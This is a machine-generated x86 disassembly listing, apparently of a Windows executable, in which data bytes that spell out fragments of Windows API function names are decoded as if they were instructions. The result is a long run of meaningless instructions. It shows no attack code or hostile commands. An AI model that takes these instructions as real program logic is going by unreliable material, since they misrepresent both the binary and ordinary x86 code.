  41400a:	fwait
  41400b:	add    dl,BYTE PTR [ebp+0x6e]
  41400e:	ins    BYTE PTR es:[edi],dx
  41400f:	outs   dx,DWORD PTR ds:[esi]
  414010:	popa   
  414011:	fs dec ebx
  414013:	gs jns 0x414078
  414016:	outs   dx,DWORD PTR ds:[esi]
  414017:	popa   
  414018:	jb     0x41407e
  41401a:	dec    esp
  41401b:	popa   
  41401c:	jns    0x41408d
  41401e:	jne    0x414094
  414020:	add    BYTE PTR [eax],al
  414022:	mov    esp,0x6e695702
  414027:	outs   dx,DWORD PTR fs:[esi]
  414029:	ja     0x414071
  41402b:	jb     0x41409c
  41402d:	ins    DWORD PTR es:[edi],dx
  41402e:	push   eax
  41402f:	outs   dx,DWORD PTR ds:[esi]
  414030:	imul   ebp,DWORD PTR [esi+0x74],0x4400ab00
  414037:	jb     0x41409a
  414039:	ja     0x41407c
  41403b:	outs   dx,BYTE PTR ds:[esi]
  41403c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  414043:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  414048:	and    BYTE PTR [edx],al
  41404a:	push   ebx
  41404b:	arpl   WORD PTR [edx+0x6f],si
  41404e:	ins    BYTE PTR es:[edi],dx
  41404f:	ins    BYTE PTR es:[edi],dx
  414050:	push   edi
  414051:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  414058:	add    BYTE PTR [eax],al
  41405a:	pop    eax
  41405b:	add    dl,BYTE PTR [ebx+0x65]
  41405e:	je     0x4140b2
  414060:	arpl   WORD PTR gs:[eax+eax*1+0x3d],si
  414065:	add    dl,BYTE PTR [ebx+0x65]
  414068:	je     0x4140ae
  41406a:	ins    BYTE PTR es:[edi],dx
  41406b:	addr16 dec ecx
  41406d:	je     0x4140d4
  41406f:	ins    DWORD PTR es:[edi],dx
  414070:	dec    ecx
  414071:	outs   dx,BYTE PTR ds:[esi]
  414072:	je     0x414074
  414074:	or     eax,0x67654200
  414079:	imul   ebp,DWORD PTR [esi+0x50],0x746e6961
  414080:	add    BYTE PTR [eax],al
  414082:	pop    ebp
  414083:	add    BYTE PTR [ebx+0x72],al
  414086:	gs popa 
  414088:	je     0x4140ef
  41408a:	dec    ecx
  41408b:	arpl   WORD PTR [edi+0x6e],bp
  41408e:	dec    ecx
  41408f:	outs   dx,BYTE PTR ds:[esi]
  414090:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  414098:	dec    esi
  414099:	add    dl,BYTE PTR [ebx+0x65]
  41409c:	je     0x4140eb
  41409e:	outs   dx,BYTE PTR gs:[esi]
  4140a0:	jne    0x4140eb
  4140a2:	je     0x414109
  4140a4:	ins    DWORD PTR es:[edi],dx
  4140a5:	dec    ecx
  4140a6:	outs   dx,BYTE PTR ds:[esi]
  4140a7:	outs   dx,WORD PTR ds:[esi]
  4140a9:	push   edi
  4140aa:	add    BYTE PTR [eax],al
  4140ac:	pop    edx
  4140ad:	add    dl,BYTE PTR [ebx+0x65]
  4140b0:	je     0x414105
  4140b2:	arpl   WORD PTR [edx+0x6f],si
  4140b5:	ins    BYTE PTR es:[edi],dx
  4140b6:	ins    BYTE PTR es:[edi],dx
  4140b7:	dec    ecx
  4140b8:	outs   dx,BYTE PTR ds:[esi]
  4140b9:	outs   dx,WORD PTR ds:[esi]
  4140bb:	add    BYTE PTR [edx],dh
  4140bd:	add    BYTE PTR [ebx+0x68],al
  4140c0:	popa   
  4140c1:	jb     0x414117
  4140c3:	outs   dx,DWORD PTR ds:[esi]
  4140c4:	dec    edi
  4140c5:	gs ins DWORD PTR es:[edi],dx
  4140c7:	inc    ecx
  4140c8:	add    BYTE PTR [eax],al
  4140ca:	sub    eax,0x6e655302
  4140cf:	fs dec esi
  4140d1:	outs   dx,DWORD PTR ds:[esi]
  4140d2:	je     0x41413d
  4140d4:	data16 jns 0x414124
  4140d7:	gs jae 0x41414d
  4140da:	popa   
  4140db:	addr16 gs push edi
  4140de:	add    BYTE PTR [eax],al
  4140e0:	sti    
  4140e1:	add    BYTE PTR [edi+0x65],al
  4140e4:	je     0x414129
  4140e6:	ins    BYTE PTR es:[edi],dx
  4140e7:	popa   
  4140e8:	jae    0x41415d
  4140ea:	dec    esi
  4140eb:	popa   
  4140ec:	ins    DWORD PTR es:[edi],dx
  4140ed:	gs push edi
  4140ef:	add    BYTE PTR [ebx+0x61725402],dl
  4140f5:	outs   dx,BYTE PTR ds:[esi]
  4140f6:	jae    0x414164
  4140f8:	popa   
  4140f9:	je     0x414160
  4140fb:	inc    ecx
  4140fc:	arpl   WORD PTR [ebx+0x65],sp
  4140ff:	ins    BYTE PTR es:[edi],dx
  414100:	gs jb  0x414164
  414103:	je     0x414174
  414105:	jb     0x414148
  414107:	add    BYTE PTR [ebx+0x2],bh
  41410a:	push   ebx
  41410b:	push   0x7543776f
  414110:	jb     0x414185
  414112:	outs   dx,DWORD PTR ds:[esi]
  414113:	jb     0x414115
  414115:	add    BYTE PTR [ebx+0x2],dh
  414118:	push   ebx
  414119:	gs je  0x414173
  41411c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  414123:	js     0x414199
  414125:	inc    ecx
  414126:	add    BYTE PTR [eax],al
  414128:	add    BYTE PTR es:[ebx+0x68],al
  41412c:	popa   
  41412d:	jb     0x41417b
  41412f:	outs   dx,DWORD PTR ds:[esi]
  414130:	ja     0x414197
  414132:	jb     0x414175
  414134:	add    BYTE PTR [eax],al
  414136:	xchg   BYTE PTR [ecx],al
  414138:	dec    ecx
  414139:	outs   dx,BYTE PTR ds:[esi]
  41413a:	jae    0x4141a1
  41413c:	jb     0x4141b2
  41413e:	dec    ebp
  41413f:	outs   dx,BYTE PTR gs:[esi]
  414141:	jne    0x41419a
  414143:	add    BYTE PTR [eax],cl
  414145:	add    BYTE PTR [ecx+0x70],al
  414148:	jo     0x4141af
  41414a:	outs   dx,BYTE PTR ds:[esi]
  41414b:	fs dec ebp
  41414d:	outs   dx,BYTE PTR gs:[esi]
  41414f:	jne    0x414192
  414151:	add    BYTE PTR [edx+0x1],ch
  414154:	inc    edi
  414155:	gs je  0x4141af
  414158:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41415f:	add    BYTE PTR [ecx+0x2],bl
  414162:	push   ebx
  414163:	gs je  0x4141b8
  414166:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  41416b:	jo     0x4141e1
  41416d:	jns    0x41416f
  41416f:	add    BYTE PTR [edx+0x1],bl
  414172:	inc    edi
  414173:	gs je  0x4141c9
  414176:	jns    0x4141eb
  414178:	inc    ebx
  414179:	outs   dx,DWORD PTR ds:[esi]
  41417a:	ins    BYTE PTR es:[edi],dx
  41417b:	outs   dx,DWORD PTR ds:[esi]
  41417c:	jb     0x4141c0
  41417e:	jb     0x4141f5
  414180:	jae    0x4141ea
  414182:	add    BYTE PTR [eax],al
  414184:	jg     0x414188
  414186:	push   ebx
  414187:	push   0x6957776f
  41418c:	outs   dx,BYTE PTR ds:[esi]
  41418d:	outs   dx,DWORD PTR fs:[esi]
  41418f:	ja     0x414191
  414191:	add    BYTE PTR [eax+eax*1],ah
  414194:	inc    ebx
  414195:	push   0x65676e61
  41419a:	dec    ebp
  41419b:	outs   dx,BYTE PTR gs:[esi]
  41419d:	jne    0x4141f6
  41419f:	add    al,ah
  4141a1:	add    DWORD PTR [edi+0x65],ecx
  4141a4:	ins    DWORD PTR es:[edi],dx
  4141a5:	push   esp
  4141a6:	outs   dx,DWORD PTR ds:[esi]
  4141a7:	inc    ebx
  4141a8:	push   0x417261
  4141ad:	add    BYTE PTR [edi+0x43734901],cl
  4141b3:	push   0x6c417261
  4141b8:	jo     0x414222
  4141ba:	popa   
  4141bb:	push   edi
  4141bc:	add    BYTE PTR [eax],al
  4141be:	xchg   BYTE PTR [edx],al
  4141c0:	push   ebx
  4141c1:	jns    0x414236
  4141c3:	je     0x41422a
  4141c5:	ins    DWORD PTR es:[edi],dx
  4141c6:	push   eax
  4141c7:	popa   
  4141c8:	jb     0x41422b
  4141ca:	ins    DWORD PTR es:[edi],dx
  4141cb:	gs je  0x414233
  4141ce:	jb     0x414243
  4141d0:	dec    ecx
  4141d1:	outs   dx,BYTE PTR ds:[esi]
  4141d2:	outs   dx,WORD PTR ds:[esi]
  4141d4:	push   edi
  4141d5:	add    BYTE PTR ds:0x67655202,al
  4141db:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  4141e2:	popa   
  4141e3:	jae    0x414258
  4141e5:	push   edi
  4141e6:	add    BYTE PTR [eax],al
  4141e8:	add    BYTE PTR [edx],0x53
  4141eb:	push   0x6957776f
  4141f0:	outs   dx,BYTE PTR ds:[esi]
  4141f1:	outs   dx,DWORD PTR fs:[esi]
  4141f3:	ja     0x414236
  4141f5:	jae    0x414270
  4141f7:	outs   dx,BYTE PTR ds:[esi]
  4141f8:	arpl   WORD PTR [eax],ax
  4141fa:	mov    edi,0x70737702
  4141ff:	jb     0x41426a
  414201:	outs   dx,BYTE PTR ds:[esi]
  414202:	je     0x41426a
  414204:	inc    ecx
  414205:	add    BYTE PTR [esi+0x2],ch
  414208:	push   ebx
  414209:	gs je  0x414263
  41420c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  414213:	outs   dx,BYTE PTR ds:[esi]
  414214:	addr16 push edi
  414216:	add    BYTE PTR [eax],al
  414218:	test   BYTE PTR [edx],al
  41421a:	push   ebx
  41421b:	ja     0x414286
  41421d:	je     0x414282
  41421f:	push   0x68546f54
  414224:	imul   esi,DWORD PTR [ebx+0x57],0x6f646e69
  41422b:	ja     0x41422d
  41422d:	add    al,al
  41422f:	add    dh,BYTE PTR [edi+0x73]
  414232:	jo     0x4142a6
  414234:	imul   ebp,DWORD PTR [esi+0x74],0x97005766
  41423b:	add    DWORD PTR [ecx+0x73],ecx
  41423e:	inc    esp
  41423f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  414246:	jae    0x4142bb
  414248:	popa   
  414249:	addr16 gs inc ecx
  41424c:	add    BYTE PTR [eax],al
  41424e:	daa    
  41424f:	add    DWORD PTR [edi+0x65],eax
  414252:	je     0x41429f
  414254:	gs jns 0x4142b9
  414257:	outs   dx,DWORD PTR ds:[esi]
  414258:	popa   
  414259:	jb     0x4142bf
  41425b:	push   esp
  41425c:	jns    0x4142ce
  41425e:	gs add bh,al
  414261:	add    BYTE PTR [ebp+0x6e],al
  414264:	jne    0x4142d3
  414266:	inc    ebx
  414267:	push   0x57646c69
  41426c:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  414273:	add    BYTE PTR [ebp+0x53],dl
  414276:	inc    ebp
  414277:	push   edx
  414278:	xor    esi,DWORD PTR [edx]
  41427a:	cs fs ins BYTE PTR es:[edi],dx
  41427d:	ins    BYTE PTR es:[edi],dx
  41427e:	add    BYTE PTR [eax],al
  414280:	lods   al,BYTE PTR ds:[esi]
  414281:	add    BYTE PTR [ebx+0x72],al
  414284:	gs popa 
  414286:	je     0x4142ed
  414288:	push   edx
  414289:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41428e:	outs   dx,BYTE PTR ds:[esi]
  41428f:	dec    ecx
  414290:	outs   dx,BYTE PTR ds:[esi]
  414291:	imul   esi,DWORD PTR fs:[edx+0x65],0x89007463
  414299:	add    BYTE PTR [ebx+0x72],al
  41429c:	gs popa 
  41429e:	je     0x414305
  4142a0:	inc    edx
  4142a1:	jb     0x414318
  4142a3:	jae    0x41430d
  4142a5:	dec    ecx
  4142a6:	outs   dx,BYTE PTR ds:[esi]
  4142a7:	imul   esi,DWORD PTR fs:[edx+0x65],0xb7007463
  4142af:	add    DWORD PTR [eax+0x74],edx
  4142b2:	push   esi
  4142b3:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  4142ba:	iret   
  4142bb:	add    DWORD PTR [ebx+0x65],edx
  4142be:	ins    BYTE PTR es:[edi],dx
  4142bf:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4142c4:	ins    BYTE PTR es:[edi],dx
  4142c5:	gs je  0x41433c
  4142c8:	add    BYTE PTR gs:[ebx+0x65724300],dl
  4142cf:	popa   
  4142d0:	je     0x414337
  4142d2:	inc    esp
  4142d3:	dec    ecx
  4142d4:	inc    edx
  4142d5:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xc4000070
  4142dd:	add    DWORD PTR [edx+0x65],edx
  4142e0:	jae    0x41434b
  4142e2:	jp     0x414349
  4142e4:	push   eax
  4142e5:	popa   
  4142e6:	ins    BYTE PTR es:[edi],dx
  4142e7:	gs je  0x41435e
  4142ea:	add    BYTE PTR gs:[ebp+0x766f4d01],bl
  4142f1:	gs push esp
  4142f3:	outs   dx,DWORD PTR ds:[esi]
  4142f4:	inc    ebp
  4142f5:	js     0x4142f7
  4142f7:	add    BYTE PTR [edx+0x65724300],bl
  4142fd:	popa   
  4142fe:	je     0x414365
  414300:	inc    esi
  414301:	outs   dx,DWORD PTR ds:[esi]
  414302:	outs   dx,BYTE PTR ds:[esi]
  414303:	je     0x41434e
  414305:	outs   dx,BYTE PTR ds:[esi]
  414306:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41430e:	mov    esp,0x6c6c4500
  414313:	imul   esi,DWORD PTR [eax+0x73],0xb30065
  41431a:	inc    esp
  41431b:	gs ins BYTE PTR es:[edi],dx
  41431d:	gs je  0x414385
  414320:	inc    esp
  414321:	inc    ebx
  414322:	add    BYTE PTR [eax],al
  414324:	aad    0x0
  414326:	inc    ebp
  414327:	js     0x41439d
  414329:	push   esp
  41432a:	gs js  0x4143a1
  41432d:	dec    edi
  41432e:	jne    0x4143a4
  414330:	push   edi
  414331:	add    BYTE PTR [edi+0x65724300],al
  414337:	popa   
  414338:	je     0x41439f
  41433a:	inc    edx
  41433b:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xba000070
  414343:	add    DWORD PTR [edx+0x65],edx
  414346:	arpl   WORD PTR [esi+edx*2+0x69],si
  41434a:	jae    0x4143b5
  41434c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  414350:	int    0x0
  414352:	inc    ebp
  414353:	jae    0x4143b8
  414355:	popa   
  414356:	jo     0x4143bd
  414358:	add    BYTE PTR [eax],al
  41435a:	fadd   QWORD PTR [ecx]
  41435c:	push   ebx
  41435d:	gs je  0x4143a4
  414360:	dec    ecx
  414361:	inc    edx
  414362:	inc    ebx
  414363:	outs   dx,DWORD PTR ds:[esi]
  414364:	ins    BYTE PTR es:[edi],dx
  414365:	outs   dx,DWORD PTR ds:[esi]
  414366:	jb     0x4143bc
  414368:	popa   
  414369:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41436d:	add    BYTE PTR [ecx+0x66664f01],ah
  414373:	jae    0x4143da
  414375:	je     0x4143cd
  414377:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41437e:	dec    edi
  41437f:	jb     0x4143e8
  414381:	inc    ebp
  414382:	js     0x414384
  414384:	and    DWORD PTR [ecx],eax
  414386:	inc    edi
  414387:	gs je  0x4143cc
  41438a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  414392:	jae    0x414394
  414394:	mov    dh,0x0
  414396:	inc    esp
  414397:	gs ins BYTE PTR es:[edi],dx
  414399:	gs je  0x414401
  41439c:	dec    edi
  41439d:	bound  ebp,QWORD PTR [edx+0x65]
  4143a0:	arpl   WORD PTR [eax+eax*1+0x0],si
  4143a4:	mov    al,ds:0x65724300
  4143a9:	popa   
  4143aa:	je     0x414411
  4143ac:	dec    eax
  4143ad:	popa   
  4143ae:	je     0x414413
  4143b0:	push   0x73757242
  4143b5:	push   0xaa0000
  4143ba:	inc    ebx
  4143bb:	jb     0x414422
  4143bd:	popa   
  4143be:	je     0x414425
  4143c0:	push   eax
  4143c1:	outs   dx,DWORD PTR ds:[esi]
  4143c2:	ins    BYTE PTR es:[edi],dx
  4143c3:	jns    0x41442c
  4143c5:	outs   dx,DWORD PTR ds:[esi]
  4143c6:	outs   dx,BYTE PTR ds:[esi]
  4143c7:	push   edx
  4143c8:	outs   dx,BYTE PTR ds:[si]
  4143ca:	add    BYTE PTR [eax],al
  4143cc:	add    DWORD PTR [eax],0x626d6f43
  4143d2:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  4143d9:	add    dl,dl
  4143db:	add    DWORD PTR [ebx+0x65],edx
  4143de:	je     0x414422
  4143e0:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  4143e8:	jae    0x4143ea
  4143ea:	lods   al,BYTE PTR ds:[esi]
  4143eb:	add    DWORD PTR [eax+0x6f],edx
  4143ee:	ins    BYTE PTR es:[edi],dx
  4143ef:	jns    0x414433
  4143f1:	gs jp  0x41445d
  4143f4:	gs jb  0x4143f7
  4143f7:	add    al,dl
  4143f9:	add    DWORD PTR [ebx+0x65],edx
  4143fc:	je     0x41443f
  4143fe:	bound  ebp,QWORD PTR [edi+0x72]
  414401:	je     0x414453
  414403:	jb     0x414474
  414405:	arpl   WORD PTR [eax],ax
  414407:	add    BYTE PTR [eax+0x66664f01],ah
  41440d:	jae    0x414474
  41440f:	je     0x414463
  414411:	outs   dx,BYTE PTR ds:[si]
  414413:	add    BYTE PTR [edx+eax*1],dl
  414416:	push   edi
  414417:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41441f:	add    BYTE PTR [eax+0x65724300],dh
  414425:	popa   
  414426:	je     0x41448d
  414428:	push   ebx
  414429:	outs   dx,DWORD PTR ds:[esi]
  41442a:	ins    BYTE PTR es:[edi],dx
  41442b:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  414433:	add    BYTE PTR [edx+0x74654701],cl
  414439:	push   esp
  41443a:	gs js  0x4144b1
  41443d:	dec    ebp
  41443e:	gs je  0x4144b3
  414441:	imul   esp,DWORD PTR [ebx+0x73],0x16c0041
  414448:	inc    edi
  414449:	gs je  0x41449c
  41444c:	popa   
  41444d:	ins    BYTE PTR es:[edi],dx
  41444e:	gs je  0x4144c5
  414451:	gs inc ebp
  414453:	outs   dx,BYTE PTR ds:[esi]
  414454:	je     0x4144c8
  414456:	imul   esp,DWORD PTR [ebp+0x73],0x4300a200
  41445d:	jb     0x4144c4
  41445f:	popa   
  414460:	je     0x4144c7
  414462:	dec    ecx
  414463:	inc    ebx
  414464:	push   edi
  414465:	add    ah,cl
  414467:	add    DWORD PTR [ebx+0x65],edx
  41446a:	ins    BYTE PTR es:[edi],dx
  41446b:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  414470:	imul   esi,DWORD PTR [eax+0x52],0xd3006e67
  414477:	add    DWORD PTR [ebx+0x65],edx
  41447a:	je     0x4144be
  41447c:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  414484:	outs   dx,BYTE PTR gs:[esi]
  414486:	jae    0x4144f1
  414488:	outs   dx,DWORD PTR ds:[esi]
  414489:	outs   dx,BYTE PTR ds:[esi]
  41448a:	inc    ebp
  41448b:	js     0x41448d
  41448d:	add    bh,dl
  41448f:	add    DWORD PTR [ebx+0x65],edx
  414492:	je     0x4144d6
  414494:	jb     0x41450b
  414496:	jae    0x414500
  414498:	dec    edi
  414499:	jb     0x414502
  41449b:	inc    ebp
  41449c:	js     0x41449e
  41449e:	into   
  41449f:	add    DWORD PTR [ebx+0x65],edx
  4144a2:	ins    BYTE PTR es:[edi],dx
  4144a3:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  4144a8:	push   0x65
  4144aa:	arpl   WORD PTR [eax+eax*1+0x0],si
  4144ae:	add    DWORD PTR [ecx],0x47
  4144b1:	gs je  0x414508
  4144b4:	gs js  0x41452b
  4144b7:	inc    ebp
  4144b8:	js     0x41452e
  4144ba:	outs   dx,BYTE PTR gs:[esi]
  4144bc:	je     0x41450e
  4144be:	outs   dx,DWORD PTR ds:[esi]
  4144bf:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  4144c6:	xlat   BYTE PTR ds:[ebx]
  4144c7:	add    BYTE PTR [esi+0x69],al
  4144ca:	ins    BYTE PTR es:[edi],dx
  4144cb:	ins    BYTE PTR es:[edi],dx
  4144cc:	push   edx
  4144cd:	outs   dx,BYTE PTR ds:[si]
  4144cf:	add    BYTE PTR [esi+0x65724300],dl
  4144d5:	popa   
  4144d6:	je     0x41453d
  4144d8:	inc    ebp
  4144d9:	ins    BYTE PTR es:[edi],dx
  4144da:	ins    BYTE PTR es:[edi],dx
  4144db:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4144e2:	outs   dx,BYTE PTR ds:[esi]
  4144e3:	dec    ecx
  4144e4:	outs   dx,BYTE PTR ds:[esi]
  4144e5:	imul   esi,DWORD PTR fs:[edx+0x65],0x6e007463
  4144ed:	add    DWORD PTR [edi+0x65],eax
  4144f0:	je     0x414542
  4144f2:	imul   edi,DWORD PTR [eax+0x65],0x7700006c
  4144f9:	add    DWORD PTR [edi+0x65],eax
  4144fc:	je     0x414551
  4144fe:	je     0x41456f
  414500:	arpl   WORD PTR [ebx+0x4f],bp
  414503:	bound  ebp,QWORD PTR [edx+0x65]
  414506:	arpl   WORD PTR [eax+eax*1+0x0],si
  41450a:	cmp    al,BYTE PTR [ecx]
  41450c:	inc    edi
  41450d:	gs je  0x414553
  414510:	jne    0x414584
  414512:	jb     0x414579
  414514:	outs   dx,BYTE PTR ds:[esi]
  414515:	je     0x414566
  414517:	bound  ebp,QWORD PTR [edx+0x65]
  41451a:	arpl   WORD PTR [eax+eax*1+0x0],si
  41451e:	jno    0x414521
  414520:	inc    edi
  414521:	gs je  0x414576
  414524:	dec    edi
  414525:	push   eax
  414526:	xor    al,BYTE PTR [eax]
  414528:	stos   DWORD PTR es:[edi],eax
  414529:	add    BYTE PTR [ebx+0x72],al
  41452c:	gs popa 
  41452e:	je     0x414595
  414530:	push   edx
  414531:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  414536:	outs   dx,BYTE PTR ds:[esi]
  414537:	add    BYTE PTR [edx+eax*1],al
  41453a:	push   ebx
  41453b:	je     0x41459e
  41453d:	jb     0x4145b3
  41453f:	inc    esp
  414540:	outs   dx,DWORD PTR ds:[esi]
  414541:	arpl   WORD PTR [edi+0x0],dx
  414544:	jbe    0x414546
  414546:	inc    edx
  414547:	imul   esi,DWORD PTR [edx+eax*2+0x6c],0x75000074
  41454f:	add    BYTE PTR [edx+0x65],al
  414552:	imul   ebp,DWORD PTR [bp+0x50],0x687461
  41455a:	mov    eax,0x61655201
  41455f:	ins    BYTE PTR es:[edi],dx
  414560:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  414567:	je     0x4145dd
  414569:	add    BYTE PTR gs:[eax],al
  41456c:	inc    edi
  41456d:	inc    esp
  41456e:	dec    ecx
  41456f:	xor    esi,DWORD PTR [edx]
  414571:	cs fs ins BYTE PTR es:[edi],dx
  414574:	ins    BYTE PTR es:[edi],dx
  414575:	add    BYTE PTR [eax+0x1],ah
  414578:	inc    esi
  414579:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  414580:	je     0x4145c8
  414582:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x3040000
  41458a:	dec    esp
  41458b:	gs popa 
  41458d:	jbe    0x4145f4
  41458f:	inc    ebx
  414590:	jb     0x4145fb
  414592:	je     0x4145fd
  414594:	arpl   WORD PTR [ecx+0x6c],sp
  414597:	push   ebx
  414598:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41459d:	outs   dx,BYTE PTR ds:[esi]
  41459e:	add    BYTE PTR [eax],al
  4145a0:	add    eax,DWORD PTR [ecx]
  4145a2:	inc    esp
  4145a3:	gs ins BYTE PTR es:[edi],dx
  4145a5:	gs je  0x41460d
  4145a8:	inc    esi
  4145a9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x4902b900
  4145b1:	outs   dx,BYTE PTR ds:[esi]
  4145b2:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  4145ba:	inc    ebx
  4145bb:	jb     0x414626
  4145bd:	je     0x414628
  4145bf:	arpl   WORD PTR [ecx+0x6c],sp
  4145c2:	push   ebx
  4145c3:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4145c8:	outs   dx,BYTE PTR ds:[esi]
  4145c9:	add    BYTE PTR [edx+0x6c614300],ah
  4145cf:	ins    BYTE PTR es:[edi],dx
  4145d0:	dec    esi
  4145d1:	popa   
  4145d2:	ins    DWORD PTR es:[edi],dx
  4145d3:	gs fs push eax
  4145d6:	imul   esi,DWORD PTR [eax+0x65],0x12000057
  4145dd:	add    al,0x53
  4145df:	gs je  0x414627
  4145e2:	jb     0x414656
  4145e4:	outs   dx,DWORD PTR ds:[esi]
  4145e5:	jb     0x414634
  4145e7:	outs   dx,DWORD PTR ds:[esi]
  4145e8:	fs add BYTE PTR gs:[eax],al
  4145ec:	pop    edi
  4145ed:	add    al,BYTE PTR [edi+0x65]
  4145f0:	je     0x414646
  4145f2:	gs ins DWORD PTR es:[edi],dx
  4145f4:	jo     0x41463c
  4145f6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  4145fe:	add    BYTE PTR [eax],al
  414600:	cmc    
  414601:	add    BYTE PTR [ebx+0x72],al
  414604:	gs popa 
  414606:	je     0x41466d
  414608:	push   edi
  414609:	popa   
  41460a:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  414612:	ins    DWORD PTR es:[edi],dx
  414613:	gs jb  0x41466d
  414616:	add    BYTE PTR [eax],al
  414618:	pop    ebp
  414619:	add    DWORD PTR [esi+0x69],eax
  41461c:	outs   dx,BYTE PTR ds:[esi]
  41461d:	fs inc esi
  41461f:	imul   esi,DWORD PTR [edx+0x73],0x6c694674
  414626:	gs inc ecx
  414628:	add    BYTE PTR [eax],al
  41462a:	test   al,0x2
  41462c:	dec    eax
  41462d:	gs popa 
  41462f:	jo     0x41467d
  414631:	outs   dx,DWORD PTR ds:[esi]
  414632:	arpl   WORD PTR [ebx+0x0],bp
  414635:	add    BYTE PTR [ebx+eax*1+0x6f6d6552],dh
  41463c:	jbe    0x4146a3
  41463e:	inc    esp
  41463f:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  414646:	jns    0x41469f
  414648:	add    BYTE PTR [eax],al
  41464a:	rol    BYTE PTR [eax],cl
  41464c:	inc    ebx
  41464d:	jb     0x4146b4
  41464f:	popa   
  414650:	je     0x4146b7
  414652:	inc    esi
  414653:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41465b:	outs   dx,BYTE PTR ds:[esi]
  41465c:	addr16 push edi
  41465e:	add    BYTE PTR [eax],al
  414660:	adc    al,0x3
  414662:	dec    esp
  414663:	outs   dx,DWORD PTR ds:[esi]
  414664:	arpl   WORD PTR [ecx+0x6c],sp
  414667:	push   ebx
  414668:	imul   edi,DWORD PTR [edx+0x65],0x47024200
  41466f:	gs je  0x4146c5
  414672:	push   0x5074726f
  414677:	popa   
  414678:	je     0x4146e2
  41467a:	dec    esi
  41467b:	popa   
  41467c:	ins    DWORD PTR es:[edi],dx
  41467d:	gs inc ecx
  41467f:	add    BYTE PTR ds:0x74654702,cl
  414685:	dec    ebp
  414686:	outs   dx,DWORD PTR ds:[esi]
  414687:	fs jne 0x4146f6
  41468a:	gs dec eax
  41468c:	popa   
  41468d:	outs   dx,BYTE PTR ds:[esi]
  41468e:	fs ins BYTE PTR es:[edi],dx
  414690:	gs push edi
  414692:	add    BYTE PTR [eax],al
  414694:	mov    ds:0x69725704,eax
  414699:	je     0x414700
  41469b:	inc    esi
  41469c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x6c470298
  4146a4:	outs   dx,DWORD PTR ds:[esi]
  4146a5:	bound  esp,QWORD PTR [ecx+0x6c]
  4146a8:	push   ebx
  4146a9:	imul   edi,DWORD PTR [edx+0x65],0xea0000
  4146b0:	inc    ebx
  4146b1:	jb     0x414718
  4146b3:	popa   
  4146b4:	je     0x41471b
  4146b6:	push   ebx
  4146b7:	gs ins DWORD PTR es:[edi],dx
  4146b9:	popa   
  4146ba:	jo     0x414724
  4146bc:	outs   dx,DWORD PTR ds:[esi]
  4146bd:	jb     0x414724
  4146bf:	push   edi
  4146c0:	add    BYTE PTR [eax],al
  4146c2:	jmp    0x4146c5
  4146c4:	inc    edi
  4146c5:	gs je  0x41470e
  4146c8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4146d0:	bound  esi,QWORD PTR [ebp+0x74]
  4146d3:	gs jae 0x41471b
  4146d6:	js     0x41472f
  4146d8:	add    BYTE PTR [eax],al
  4146da:	mov    ebx,0x73655203
  4146df:	gs je  0x414727
  4146e2:	jbe    0x414749
  4146e4:	outs   dx,BYTE PTR ds:[esi]
  4146e5:	je     0x4146e7
  4146e7:	add    BYTE PTR [esi+0x4],cl
  4146ea:	push   ebx
  4146eb:	ins    BYTE PTR es:[edi],dx
  4146ec:	gs gs jo 0x414735
  4146f0:	js     0x4146f2
  4146f2:	int3   
  4146f3:	add    al,0x6c
  4146f5:	jae    0x41476b
  4146f7:	jb     0x41475c
  4146f9:	jo     0x414774
  4146fb:	outs   dx,BYTE PTR ds:[esi]
  4146fc:	push   edi
  4146fd:	add    dl,cl
  4146ff:	add    BYTE PTR [ebx+0x72],al
  414702:	gs popa 
  414704:	je     0x41476b
  414706:	inc    ebp
  414707:	jbe    0x41476e
  414709:	outs   dx,BYTE PTR ds:[esi]
  41470a:	je     0x41474d
  41470c:	add    BYTE PTR [eax],al
  41470e:	push   eax
  41470f:	add    al,BYTE PTR [edi+0x65]
  414712:	je     0x414767
  414714:	jns    0x414789
  414716:	je     0x41477d
